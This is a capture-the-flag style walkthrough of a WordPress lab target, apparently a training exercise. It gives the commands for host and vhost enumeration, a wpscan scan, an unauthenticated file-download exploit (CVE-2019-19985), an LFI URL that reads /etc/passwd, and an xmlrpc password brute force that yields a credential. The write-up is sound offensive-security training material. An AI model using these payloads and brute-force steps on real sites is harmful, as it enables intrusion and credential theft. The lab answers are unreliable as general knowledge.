
<img width="645" height="262" alt="image" src="https://github.com/user-attachments/assets/ad22174c-e2c0-47d1-8d34-f2105b1cd4a3" />

curl -s http://10.129.2.37:80 | html2text | grep -i 'inlanefreight'

=> info@inlanefreight.local Contact Support

gobuster vhost -u http://inlanefreight.local:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --append-domain

=> blog.inlanefreight.local:80 Status: 301 [Size: 0] [--> http://blog.inlanefreight.local/]

1) Identify the WordPress version number.
wpscan --url http://blog.inlanefreight.local:80 --enumerate --api-token lt4NL8W6nT758d3wfOuhq...

=> 5.1.6

2) Identify the WordPress theme in use.
curl -s -X GET http://blog.inlanefreight.local:80 | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

=> twentynineteen

3) Submit the contents of the flag file in the directory with directory listing enabled.

=> http://blog.inlanefreight.local/wp-content/uploads/

4) Identify the only non-admin WordPress user. (Format: <first-name> <last-name>)

=> Charlie Wiggins

5) Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.

<img width="912" height="408" alt="image" src="https://github.com/user-attachments/assets/12086bb6-4aa3-450a-97c1-2fa3257c7a7f" />

=> https://www.cve.org/CVERecord?id=CVE-2019-19985

=> http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all

6) What is the version number of the plugin vulnerable to an LFI?

[+] site-editor

 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 
 | Latest Version: 1.1.1 (up to date)

7) Use the LFI to identify a system user whose name starts with the letter "f".

http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

8) Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.

wpscan --password-attack xmlrpc -t 20 -U erika -P rockyou.txt --url http://blog.inlanefreight.local

=> [SUCCESS] - erika / 010203  
